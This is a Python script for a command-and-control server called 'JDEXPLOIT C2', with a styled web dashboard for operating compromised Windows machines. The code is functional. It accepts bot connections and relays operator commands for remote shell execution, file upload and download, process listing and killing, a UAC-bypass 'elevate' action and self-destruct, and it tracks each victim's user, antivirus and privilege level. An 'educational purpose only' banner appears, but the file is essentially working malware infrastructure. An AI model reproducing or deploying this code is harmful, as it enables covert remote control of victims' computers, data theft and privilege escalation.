#!/usr/bin/env python3
# ============================================================================
# JDEXPLOIT C2 v1.0 - RED/BLACK EDITION - COMPLETO
# Funcionalidades: Shell, Exec, Upload, Download, Elevate, Info, Processes, Dir
# ============================================================================

import os
import sys
import json
import time
import socket
import struct
import base64
import threading
import hashlib
import datetime
import random
from http import server
from socketserver import ThreadingMixIn
from urllib.parse import urlparse

# ============================================================================
# CONFIGURACIÓN
# ============================================================================
HOST = '0.0.0.0'
C2_PORT = 4444
WEB_PORT = 8080

class Colors:
    RED = '\033[91m'; WHITE = '\033[97m'; END = '\033[0m'

# ============================================================================
# CLIENTE (BOT)
# ============================================================================
class Client:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Windows 11"
        self.antivirus = "Defender"
        self.first_seen = datetime.datetime.now()
        self.active = True
        self.privilege = "USER"
    
    def send(self, data):
        try:
            self.conn.send(struct.pack('>I', len(data)) + data.encode())
            return True
        except:
            self.active = False
            return False
    
    def recv(self):
        try:
            raw_len = self.recvall(4)
            if not raw_len: return None
            msglen = struct.unpack('>I', raw_len)[0]
            data = self.recvall(msglen)
            return data.decode() if data else None
        except:
            self.active = False
            return None
    
    def recvall(self, n):
        data = bytearray()
        while len(data) < n:
            packet = self.conn.recv(n - len(data))
            if not packet: return None
            data.extend(packet)
        return bytes(data)
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip': self.addr[0],
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os,
            'antivirus': self.antivirus,
            'privilege': self.privilege,
            'status': 'online' if self.active else 'offline',
            'first_seen': self.first_seen.strftime('%H:%M:%S')
        }

# ============================================================================
# C2 CORE
# ============================================================================
class C2Core:
    def __init__(self):
        self.clients = {}
        self.current_client = None
        self.running = True
    
    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((HOST, C2_PORT))
        self.socket.listen(100)
        print(f"{Colors.RED}[🔥] C2 CORE LISTENING ON {HOST}:{C2_PORT}{Colors.END}")
        threading.Thread(target=self.accept_clients, daemon=True).start()
    
    def accept_clients(self):
        while self.running:
            try:
                conn, addr = self.socket.accept()
                client = Client(conn, addr)
                self.clients[client.id] = client
                print(f"{Colors.RED}[🔥] NEW CLIENT: {client.id} FROM {addr[0]}{Colors.END}")
                client.send("INFO")
                info = client.recv()
                if info:
                    try:
                        data = json.loads(info)
                        client.hostname = data.get('hostname', 'Unknown')
                        client.username = data.get('username', 'Unknown')
                    except: pass
            except Exception as e:
                if self.running:
                    print(f"{Colors.RED}[-] ERROR: {e}{Colors.END}")
    
    def send_command(self, client_id, command):
        if client_id not in self.clients: return "Client not found"
        client = self.clients[client_id]
        if not client.active: return "Client offline"
        client.send(command)
        response = client.recv()
        return response if response else "No response"

# ============================================================================
# SERVIDOR WEB - DASHBOARD COMPLETO
# ============================================================================
class WebHandler(server.BaseHTTPRequestHandler):
    c2 = None
    
    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/': 
            self.send_html()
        elif path == '/api/clients': 
            self.send_clients()
        elif path == '/api/processes':
            self.send_processes()
        else: 
            self.send_error(404)
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        data = json.loads(post_data)
        
        if self.path == '/api/command':
            client_id = data.get('client_id')
            command = data.get('command')
            args = data.get('args', '')
            full_cmd = f"{command}|{args}" if args else command
            response = WebHandler.c2.send_command(client_id, full_cmd)
            self.send_json({'response': response})
        
        elif self.path == '/api/upload':
            client_id = data.get('client_id')
            remote_path = data.get('remote_path')
            file_data = data.get('file_data')
            response = WebHandler.c2.send_command(client_id, f"UPLOAD|{remote_path}|{file_data}")
            self.send_json({'response': response})
        
        elif self.path == '/api/download':
            client_id = data.get('client_id')
            remote_path = data.get('remote_path')
            response = WebHandler.c2.send_command(client_id, f"DOWNLOAD|{remote_path}")
            self.send_json({'response': response})
    
    def send_json(self, obj):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode())
    
    def send_html(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>JDEXPLOIT C2 - RED/BLACK EDITION</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
                
                body {
                    background: #000000;
                    color: #ffffff;
                    font-family: 'Share Tech Mono', monospace;
                    padding: 30px;
                }
                
                body::before {
                    content: "";
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: repeating-linear-gradient(0deg, rgba(255,0,0,0.03) 0px, rgba(0,0,0,0.9) 2px, rgba(255,0,0,0.03) 3px);
                    pointer-events: none;
                    animation: scan 8s linear infinite;
                }
                
                @keyframes scan { 0% { transform: translateY(0); } 100% { transform: translateY(100%); } }
                
                .container { max-width: 1800px; margin: 0 auto; position: relative; z-index: 10000; }
                
                .header {
                    background: linear-gradient(135deg, #1a0000 0%, #000000 100%);
                    border: 2px solid #ff0000;
                    padding: 30px;
                    margin-bottom: 30px;
                    box-shadow: 0 0 30px rgba(255,0,0,0.3);
                    animation: pulse 2s infinite;
                }
                
                @keyframes pulse {
                    0% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
                    50% { box-shadow: 0 0 50px rgba(255,0,0,0.6); }
                    100% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
                }
                
                .header h1 {
                    color: #ff0000;
                    font-family: 'Orbitron', sans-serif;
                    font-size: 48px;
                    font-weight: 900;
                    text-transform: uppercase;
                    text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
                    letter-spacing: 8px;
                    animation: flicker 3s infinite;
                }
                
                @keyframes flicker {
                    0%,100% { opacity: 1; }
                    33% { opacity: 0.9; text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
                    66% { opacity: 1; text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000; }
                }
                
                .badge {
                    background: #ff0000;
                    color: #000000;
                    padding: 8px 20px;
                    display: inline-block;
                    font-family: 'Orbitron', sans-serif;
                    font-weight: bold;
                    font-size: 16px;
                    letter-spacing: 3px;
                    margin-top: 10px;
                    box-shadow: 0 0 20px #ff0000;
                    animation: glitch 2s infinite;
                }
                
                @keyframes glitch {
                    0%,100% { transform: skew(0deg, 0deg); }
                    95% { transform: skew(5deg, 2deg); }
                    96% { transform: skew(-5deg, -2deg); }
                    97% { transform: skew(3deg, 1deg); }
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 25px;
                    margin-top: 30px;
                }
                
                .stat-card {
                    background: #0a0000;
                    border: 1px solid #ff0000;
                    padding: 25px;
                    position: relative;
                    transition: all 0.3s;
                    box-shadow: 0 0 15px rgba(255,0,0,0.2);
                }
                
                .stat-card:hover {
                    transform: translateY(-5px);
                    border-color: #ff3333;
                    box-shadow: 0 0 30px #ff0000;
                }
                
                .stat-card::before {
                    content: "▶";
                    color: #ff0000;
                    position: absolute;
                    top: 10px;
                    left: 10px;
                    font-size: 12px;
                    animation: blink 1s infinite;
                }
                
                @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
                
                .stat-label { color: #ff9999; font-size: 14px; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 10px; }
                .stat-value { color: #ffffff; font-size: 42px; font-weight: bold; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 15px #ff0000; }
                
                .clients-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
                    gap: 25px;
                    margin: 30px 0;
                }
                
                .client-card {
                    background: #080000;
                    border: 1px solid #ff3333;
                    padding: 25px;
                    border-left: 8px solid #ff0000;
                    transition: all 0.3s;
                }
                
                .client-card:hover {
                    background: #0c0000;
                    border-color: #ff6666;
                    box-shadow: 0 0 30px rgba(255,0,0,0.5);
                    transform: scale(1.02);
                }
                
                .client-card.online { border-left-color: #ff0000; }
                .client-card.offline { border-left-color: #660000; opacity: 0.6; }
                
                .client-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 20px;
                    border-bottom: 1px solid #ff0000;
                    padding-bottom: 15px;
                }
                
                .client-id {
                    background: #ff0000;
                    color: #000000;
                    padding: 8px 16px;
                    font-family: 'Orbitron', sans-serif;
                    font-weight: bold;
                    letter-spacing: 2px;
                    box-shadow: 0 0 15px #ff0000;
                }
                
                .status-badge {
                    padding: 6px 16px;
                    font-size: 12px;
                    font-weight: bold;
                    text-transform: uppercase;
                    letter-spacing: 2px;
                }
                
                .status-badge.online {
                    background: #ff0000;
                    color: #000000;
                    box-shadow: 0 0 15px #ff0000;
                }
                
                .status-badge.offline {
                    background: #330000;
                    color: #ff6666;
                }
                
                .client-info {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 15px;
                    margin-bottom: 20px;
                }
                
                .info-item {
                    background: #000000;
                    border: 1px solid #660000;
                    padding: 12px;
                }
                
                .info-label { color: #ff6666; font-size: 10px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
                .info-value { color: #ffffff; font-size: 14px; font-family: 'Courier New', monospace; font-weight: bold; }
                
                .client-actions {
                    display: flex;
                    gap: 10px;
                    margin-top: 15px;
                    flex-wrap: wrap;
                }
                
                .btn {
                    background: transparent;
                    border: 1px solid #ff0000;
                    color: #ff0000;
                    padding: 10px 18px;
                    font-family: 'Share Tech Mono', monospace;
                    font-size: 12px;
                    font-weight: bold;
                    text-transform: uppercase;
                    letter-spacing: 2px;
                    cursor: pointer;
                    transition: all 0.3s;
                    flex: 1;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 8px;
                }
                
                .btn:hover {
                    background: #ff0000;
                    color: #000000;
                    box-shadow: 0 0 20px #ff0000;
                    border-color: #ffffff;
                }
                
                .terminal {
                    background: #050000;
                    border: 2px solid #ff0000;
                    margin-top: 30px;
                    box-shadow: 0 0 30px rgba(255,0,0,0.3);
                }
                
                .terminal-header {
                    background: #1a0000;
                    padding: 15px 20px;
                    border-bottom: 2px solid #ff0000;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }
                
                .terminal-header span {
                    color: #ff0000;
                    font-family: 'Orbitron', sans-serif;
                    font-weight: bold;
                    letter-spacing: 3px;
                }
                
                .terminal-content {
                    background: #000000;
                    padding: 20px;
                    font-family: 'Courier New', monospace;
                    font-size: 14px;
                    height: 350px;
                    overflow-y: auto;
                    color: #ff9999;
                }
                
                .terminal-input {
                    display: flex;
                    padding: 15px;
                    background: #0a0000;
                    border-top: 2px solid #ff0000;
                }
                
                .terminal-input input {
                    flex: 1;
                    background: #000000;
                    border: 1px solid #ff3333;
                    color: #ffffff;
                    padding: 15px;
                    font-family: 'Courier New', monospace;
                    font-size: 14px;
                    margin-right: 10px;
                }
                
                .terminal-input input:focus {
                    outline: none;
                    border-color: #ff0000;
                    box-shadow: 0 0 15px #ff0000;
                }
                
                .upload-panel {
                    background: #050000;
                    border: 1px solid #ff0000;
                    padding: 20px;
                    margin-top: 20px;
                    display: none;
                }
                
                .upload-panel.active {
                    display: block;
                }
                
                .footer {
                    margin-top: 50px;
                    padding: 30px;
                    background: #050000;
                    border: 1px solid #ff0000;
                    text-align: center;
                    font-family: 'Orbitron', sans-serif;
                    letter-spacing: 4px;
                }
                
                .footer .autor {
                    color: #ff0000;
                    font-size: 24px;
                    font-weight: 900;
                    text-shadow: 0 0 20px #ff0000;
                    margin-bottom: 10px;
                    animation: pulse 2s infinite;
                }
                
                .footer .copy { color: #ff6666; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔴 JDEXPLOIT C2</h1>
                    <div class="badge">⚡ RED/BLACK EDITION v1.0 ⚡</div>
                    
                    <div class="stats">
                        <div class="stat-card">
                            <div class="stat-label">Total Clients</div>
                            <div class="stat-value" id="total-clients">0</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Online</div>
                            <div class="stat-value" id="online-clients" style="color: #ff0000;">0</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">SYSTEM</div>
                            <div class="stat-value" id="system-clients">0</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Uptime</div>
                            <div class="stat-value" id="uptime">00:00:00</div>
                        </div>
                    </div>
                </div>
                
                <h2 style="color: #ff0000; font-family: 'Orbitron', sans-serif; margin-bottom: 20px; letter-spacing: 4px;">
                    ⚡ CONNECTED CLIENTS ⚡
                </h2>
                <div id="clients-container" class="clients-grid"></div>
                
                <div class="terminal">
                    <div class="terminal-header">
                        <div>
                            <span>🔥 JDEXPLOIT REMOTE SHELL 🔥</span>
                            <span id="current-client-label" style="color: #ff6666; margin-left: 20px;">(none selected)</span>
                        </div>
                        <div>
                            <button class="btn" onclick="clearTerminal()" style="background: #330000;">
                                <i class="fas fa-trash"></i> CLEAR
                            </button>
                        </div>
                    </div>
                    <div id="terminal-output" class="terminal-content">
                        <span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>
                        <span style="color: #ff6666;">[•] Select a client to begin remote control</span><br>
                        <span style="color: #ff9999;">[•] Available commands:</span><br>
                        <span style="color: #ff9999;">    - shell &#60;cmd&#62;     : Execute any command</span><br>
                        <span style="color: #ff9999;">    - exec &#60;program&#62;  : Run program (calc, notepad)</span><br>
                        <span style="color: #ff9999;">    - dir &#60;path&#62;       : List directory</span><br>
                        <span style="color: #ff9999;">    - download &#60;file&#62;  : Download file</span><br>
                        <span style="color: #ff9999;">    - upload &#60;file&#62;     : Upload file</span><br>
                        <span style="color: #ff9999;">    - processes         : List processes</span><br>
                        <span style="color: #ff9999;">    - kill &#60;pid&#62;       : Kill process</span><br>
                        <span style="color: #ff9999;">    - info             : System info</span><br>
                        <span style="color: #ff9999;">    - elevate          : Bypass UAC</span><br>
                        <span style="color: #ff9999;">    - selfdestruct     : Remove itself</span><br><br>
                    </div>
                    <div class="terminal-input">
                        <input type="text" id="terminal-cmd" placeholder=">_ enter command (ej: shell whoami, exec calc.exe, dir C:\\Users, download file.txt, upload)" disabled>
                        <button class="btn" onclick="sendTerminalCommand()" id="terminal-send" disabled>EXECUTE</button>
                    </div>
                </div>
                
                <div id="upload-modal" class="upload-panel">
                    <h3 style="color: #ff0000; margin-bottom: 15px;">📤 UPLOAD FILE</h3>
                    <input type="file" id="upload-file" style="display: none;">
                    <div style="display: flex; gap: 10px;">
                        <input type="text" id="upload-remote-path" placeholder="Remote path (ej: C:\\Users\\file.exe)" style="flex: 1; background: #000000; border: 1px solid #ff0000; color: white; padding: 10px;">
                        <button class="btn" onclick="document.getElementById('upload-file').click()">SELECT FILE</button>
                        <button class="btn btn-primary" onclick="uploadFile()">UPLOAD</button>
                        <button class="btn" onclick="closeUploadPanel()">CANCEL</button>
                    </div>
                </div>
                
                <div class="footer">
                    <div class="autor">🔴 JDEXPLOIT 🔴</div>
                    <div class="copy">██████ RED TEAM OPERATOR ██████</div>
                    <div style="color: #ff3333; margin-top: 15px; font-size: 12px;">
                        ⚡ SOLO ENTORNOS AUTORIZADOS • EDUCATIONAL PURPOSE ONLY ⚡
                    </div>
                    <div style="color: #660000; margin-top: 20px; letter-spacing: 2px;">
                        ───━═══ FULLY FUNCTIONAL C2 v1.0 ═══━───
                    </div>
                </div>
            </div>
            
            <script src="https://kit.fontawesome.com/8d4a5b8c5b.js" crossorigin="anonymous"></script>
            <script>
                let currentClientId = null;
                let clients = {};
                let selectedFile = null;
                
                setInterval(loadClients, 2000);
                setInterval(updateStats, 2000);
                
                function loadClients() {
                    fetch('/api/clients')
                        .then(r => r.json())
                        .then(data => {
                            clients = {};
                            data.forEach(c => clients[c.id] = c);
                            renderClients(data);
                        });
                }
                
                function renderClients(clientsList) {
                    const container = document.getElementById('clients-container');
                    container.innerHTML = '';
                    
                    clientsList.forEach(client => {
                        const card = document.createElement('div');
                        card.className = 'client-card ' + client.status;
                        card.innerHTML = `
                            <div class="client-header">
                                <span class="client-id">🔴 ${client.id}</span>
                                <span class="status-badge ${client.status}">${client.status}</span>
                            </div>
                            <div class="client-info">
                                <div class="info-item">
                                    <div class="info-label">HOSTNAME</div>
                                    <div class="info-value">${client.hostname}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">USERNAME</div>
                                    <div class="info-value">${client.username}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">IP ADDRESS</div>
                                    <div class="info-value">${client.ip}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">OS</div>
                                    <div class="info-value">${client.os}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">PRIVILEGE</div>
                                    <div class="info-value" style="color: ${client.privilege == 'SYSTEM' ? '#ff0000' : '#ff9999'};">
                                        ${client.privilege}
                                    </div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">ANTIVIRUS</div>
                                    <div class="info-value">${client.antivirus}</div>
                                </div>
                            </div>
                            <div class="client-actions">
                                <button class="btn" onclick="selectClient('${client.id}')">
                                    <i class="fas fa-terminal"></i> SHELL
                                </button>
                                <button class="btn" onclick="showUploadPanel('${client.id}')">
                                    <i class="fas fa-upload"></i> UPLOAD
                                </button>
                                <button class="btn" onclick="promptDownload('${client.id}')">
                                    <i class="fas fa-download"></i> DOWNLOAD
                                </button>
                                <button class="btn" onclick="elevateClient('${client.id}')">
                                    <i class="fas fa-shield-alt"></i> ELEVATE
                                </button>
                                <button class="btn" onclick="getInfo('${client.id}')">
                                    <i class="fas fa-info-circle"></i> INFO
                                </button>
                                <button class="btn" onclick="getProcesses('${client.id}')">
                                    <i class="fas fa-tasks"></i> PROCESSES
                                </button>
                            </div>
                        `;
                        container.appendChild(card);
                    });
                }
                
                function selectClient(clientId) {
                    currentClientId = clientId;
                    if (clients[clientId]) {
                        document.getElementById('current-client-label').innerHTML = 
                            '(' + clients[clientId].hostname + ' - ' + clientId + ')';
                        addToTerminal('[🔥] Connected to: ' + clients[clientId].hostname + ' (' + clientId + ')', '#ff0000');
                        addToTerminal('[•] OS: ' + clients[clientId].os + ' | User: ' + clients[clientId].username + 
                                   ' | Priv: ' + clients[clientId].privilege, '#ff6666');
                    }
                    document.getElementById('terminal-cmd').disabled = false;
                    document.getElementById('terminal-send').disabled = false;
                }
                
                function sendTerminalCommand() {
                    const cmd = document.getElementById('terminal-cmd').value;
                    if (!cmd || !currentClientId) return;
                    
                    addToTerminal('> ' + cmd, '#ff9999');
                    document.getElementById('terminal-cmd').value = '';
                    
                    let command = cmd.split(' ')[0];
                    let args = cmd.substring(cmd.indexOf(' ') + 1);
                    
                    fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client_id: currentClientId,
                            command: command,
                            args: args
                        })
                    })
                    .then(r => r.json())
                    .then(data => {
                        addToTerminal(data.response, '#cccccc');
                    });
                }
                
                function showUploadPanel(clientId) {
                    currentClientId = clientId;
                    document.getElementById('upload-modal').classList.add('active');
                }
                
                function closeUploadPanel() {
                    document.getElementById('upload-modal').classList.remove('active');
                }
                
                document.getElementById('upload-file').addEventListener('change', function(e) {
                    selectedFile = e.target.files[0];
                    if (selectedFile) {
                        document.getElementById('upload-remote-path').value = 'C:\\Users\\' + selectedFile.name;
                    }
                });
                
                function uploadFile() {
                    if (!currentClientId || !selectedFile) {
                        addToTerminal('[-] No file selected', '#ff4d4d');
                        return;
                    }
                    
                    const remotePath = document.getElementById('upload-remote-path').value;
                    if (!remotePath) {
                        addToTerminal('[-] No remote path specified', '#ff4d4d');
                        return;
                    }
                    
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        const fileData = btoa(e.target.result);
                        
                        fetch('/api/upload', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                client_id: currentClientId,
                                remote_path: remotePath,
                                file_data: fileData
                            })
                        })
                        .then(r => r.json())
                        .then(data => {
                            addToTerminal(data.response, '#cccccc');
                            closeUploadPanel();
                            selectedFile = null;
                        });
                    };
                    reader.readAsBinaryString(selectedFile);
                }
                
                function promptDownload(clientId) {
                    const remotePath = prompt('Enter remote file path:', 'C:\\Users\\file.txt');
                    if (remotePath) {
                        fetch('/api/download', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                client_id: clientId,
                                remote_path: remotePath
                            })
                        })
                        .then(r => r.json())
                        .then(data => {
                            addToTerminal(data.response, '#cccccc');
                        });
                    }
                }
                
                function elevateClient(clientId) {
                    addToTerminal('[⚠️] Attempting privilege escalation...', '#ffaa00');
                    fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client_id: clientId,
                            command: 'ELEVATE',
                            args: ''
                        })
                    })
                    .then(r => r.json())
                    .then(data => {
                        addToTerminal(data.response, data.response.includes('[+]') ? '#00ff9d' : '#ff4d4d');
                    });
                }
                
                function getInfo(clientId) {
                    fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client_id: clientId,
                            command: 'INFO_FULL',
                            args: ''
                        })
                    })
                    .then(r => r.json())
                    .then(data => {
                        addToTerminal(data.response, '#cccccc');
                    });
                }
                
                function getProcesses(clientId) {
                    fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client_id: clientId,
                            command: 'PROCESSES',
                            args: ''
                        })
                    })
                    .then(r => r.json())
                    .then(data => {
                        addToTerminal(data.response, '#cccccc');
                    });
                }
                
                function addToTerminal(text, color = '#ff9999') {
                    const output = document.getElementById('terminal-output');
                    const line = document.createElement('div');
                    line.style.color = color;
                    line.style.marginBottom = '5px';
                    line.style.fontFamily = 'Courier New';
                    line.style.borderLeft = color === '#ff0000' ? '3px solid #ff0000' : 'none';
                    line.style.paddingLeft = color === '#ff0000' ? '10px' : '0';
                    line.innerHTML = text.replace(/\\n/g, '<br>');
                    output.appendChild(line);
                    output.scrollTop = output.scrollHeight;
                }
                
                function clearTerminal() {
                    const output = document.getElementById('terminal-output');
                    output.innerHTML = '<span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>' +
                                     '<span style="color: #ff6666;">[•] Select a client to begin remote control</span><br>' +
                                     '<span style="color: #ff9999;">[•] Commands: shell, exec, dir, download, upload, processes, kill, info, elevate, selfdestruct</span><br><br>';
                }
                
                function updateStats() {
                    const total = Object.keys(clients).length;
                    const online = Object.values(clients).filter(c => c.status === 'online').length;
                    const system = Object.values(clients).filter(c => c.privilege === 'SYSTEM').length;
                    
                    document.getElementById('total-clients').innerText = total;
                    document.getElementById('online-clients').innerText = online;
                    document.getElementById('system-clients').innerText = system;
                    
                    const uptime = Math.floor((Date.now() - window.startTime) / 1000);
                    const hours = Math.floor(uptime / 3600);
                    const minutes = Math.floor((uptime % 3600) / 60);
                    const seconds = uptime % 60;
                    document.getElementById('uptime').innerText = 
                        hours.toString().padStart(2, '0') + ':' + 
                        minutes.toString().padStart(2, '0') + ':' + 
                        seconds.toString().padStart(2, '0');
                }
                
                window.startTime = Date.now();
                loadClients();
            </script>
        </body>
        </html>
        """
        self.wfile.write(html.encode())
    
    def send_clients(self):
        self.send_json([client.to_dict() for client in WebHandler.c2.clients.values()])
    
    def send_processes(self):
        if WebHandler.c2.current_client:
            response = WebHandler.c2.send_command(WebHandler.c2.current_client.id, "PROCESSES")
            self.send_json({'processes': response})
        else:
            self.send_json({'processes': 'No client selected'})
    
    def log_message(self, format, *args):
        pass

class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
    pass

# ============================================================================
# MAIN
# ============================================================================
def main():
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                     🔴 JDEXPLOIT C2 - RED/BLACK EDITION 🔴                   ║
║                          Remote Administration Tool                          ║
║                          SOLO ENTORNO DE LABORATORIO                         ║
║                                                                              ║
║                        ⚡ BY JDEXPLOIT ⚡ v1.0                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
    
{Colors.RED}[🔥]{Colors.END} C2 Core:     {Colors.WHITE}{HOST}:{C2_PORT}{Colors.END}
{Colors.RED}[🔥]{Colors.END} Web UI:      {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}
{Colors.RED}[🔥]{Colors.END} Author:      {Colors.WHITE}JDEXPLOIT{Colors.END}
{Colors.RED}[🔥]{Colors.END} Status:      {Colors.RED}ACTIVE{Colors.END}
{Colors.RED}[🔥]{Colors.END} Features:    {Colors.WHITE}SHELL • EXEC • UPLOAD • DOWNLOAD • ELEVATE • PROCESSES • KILL • INFO{Colors.END}
    """)
    
    c2 = C2Core()
    c2.start()
    
    WebHandler.c2 = c2
    web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
    print(f"{Colors.RED}[🔥]{Colors.END} Web dashboard: {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}")
    
    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[⚠️] Shutting down...{Colors.END}")
        c2.running = False
        sys.exit(0)

if __name__ == '__main__':
    main()
